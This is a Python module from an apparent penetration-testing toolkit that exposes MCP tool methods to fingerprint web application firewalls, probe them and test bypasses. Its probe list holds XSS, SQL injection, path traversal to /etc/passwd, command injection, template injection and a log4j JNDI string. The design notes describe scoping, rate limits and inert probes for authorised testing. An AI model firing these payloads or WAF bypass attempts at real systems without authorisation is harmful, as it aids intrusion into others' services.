#!/usr/bin/env python3
"""core.py — WafCore: the four public WAF tool methods (ported from the proven
waf/waf_core.py).

Design:
  * ALL target-facing HTTP goes through the bridge (aobh.core.bridge.BridgeClient):
    scoped, rate-limited, annotated ("WAF ..." notes). Direct fallback only
    with ATAP_ALLOW_DIRECT=1 for local labs, flagged in results.
  * Probes are INERT strings chosen to test the WAF's regex, not the backend:
    log4j probe uses the non-resolvable .invalid TLD; every probe is a single
    GET with a dummy parameter. Battery is hard-capped per host per engagement
    (WAF_PROBE_MAX, default 16 requests) via waf_state.json in the engagement dir.
  * The classification engine lives in fingerprint.py, the transform engine in
    transforms.py, the budgeted bypass tester in bypass.py; this class keeps the
    original public surface (waf_fingerprint / waf_probe / waf_adapt /
    waf_test_bypass) and hosts the probe battery.
"""
from __future__ import annotations

import os
from urllib.parse import quote, urlparse

from aobh.core.bridge import BridgeClient
from aobh.waf.bypass import _budget_bump, test_bypass
from aobh.waf.errors import WafError
from aobh.waf.fingerprint import classify_response, waf_fingerprint
from aobh.waf.transforms import adapt, apply_transform, TRANSFORM_ORDER

PROBE_CAP_DEFAULT = 16

__all__ = ["WafCore", "WafError", "PROBES", "PROBE_CAP_DEFAULT"]


def _env(name, default=None):
    return os.environ.get(name, default)


# ---------------------------------------------------------------------------
# Probe battery — inert WAF-regex tests (single GET, dummy param, /invalid TLD)
# ---------------------------------------------------------------------------
PROBES = [
    ("xss-tag", "<img src=x onerror=alert(1)>"),
    ("xss-event", '" onmouseover="alert(1)'),
    ("xss-svg", "<svg/onload=alert(1)>"),
    ("sqli-quote", "' OR '1'='1"),
    ("sqli-union", "1 UNION SELECT user,password FROM users"),
    ("sqli-sleep", "' AND SLEEP(5)-- -"),
    ("sqli-comment", "'-- -"),
    ("path-trav", "../../../etc/passwd"),
    ("cmd-inj", "; ls -la"),
    ("ssti", "{{7*7}}"),
    ("log4j", "${jndi:ldap://x.invalid}"),
    ("php-wrapper", "php://filter/convert.base64-encode/resource=index"),
]


# ---------------------------------------------------------------------------
# MCP handlers
# ---------------------------------------------------------------------------
class WafCore:
    def __init__(self, bridge: BridgeClient | None = None):
        self.bridge = bridge or BridgeClient()

    # ---- 1. waf_fingerprint ----
    def waf_fingerprint(self, url: str | None = None, response: dict | None = None) -> dict:
        return waf_fingerprint(self.bridge, url=url, response=response)

    # ---- 2. waf_probe ----
    def waf_probe(self, target: str, path: str = "/", param: str = "x", max_probes: int = 12) -> dict:
        base = target.rstrip("/")
        cap = int(_env("WAF_PROBE_MAX", PROBE_CAP_DEFAULT))
        host = urlparse(base).netloc
        probes = PROBES[:max(1, min(int(max_probes), len(PROBES)))]
        budget = _budget_bump(host, 1 + len(probes), cap, "probe_requests")  # + baseline
        resp = self.bridge.request("GET", f"{base}{path}", note=f"WAF probe baseline {base}{path}")
        baseline = classify_response(resp)
        results = []
        for pid, payload in probes:
            u = f"{base}{path}?{param}={quote(payload, safe='')}"
            r = self.bridge.request("GET", u, note=f"WAF probe [{pid}] {base}{path}")
            c = classify_response(r)
            results.append({"id": pid, "payload": payload, "status": r.get("status"),
                            "blocked": c["verdict"] in ("blocked", "challenge"),
                            "verdict": c["verdict"]})
        blocked_ids = [r["id"] for r in results if r["blocked"]]
        return {"ok": True, "data": {
            "baseline": {"status": baseline["status"], "verdict": baseline["verdict"],
                         "vendors": [v["vendor"] for v in baseline["vendors"]]},
            "results": results, "blocked_patterns": blocked_ids,
            "passed_patterns": [r["id"] for r in results if not r["blocked"]],
            "requests_sent": len(results) + 1, "budget": budget,
            "note": "Inert single-GET probes testing the WAF's regex, not the backend. "
                    "Map informs payload selection (T-1); a fully-open WAF is a finding angle too.",
        }}

    # ---- 3. waf_adapt ----
    def waf_adapt(self, request: dict, block_response: dict | None = None) -> dict:
        return adapt(request, block_response)

    # ---- 4. waf_test_bypass ----
    def waf_test_bypass(self, request: dict, transform_ids: list[str], max_attempts: int = 8) -> dict:
        return test_bypass(self.bridge, request, transform_ids, max_attempts)
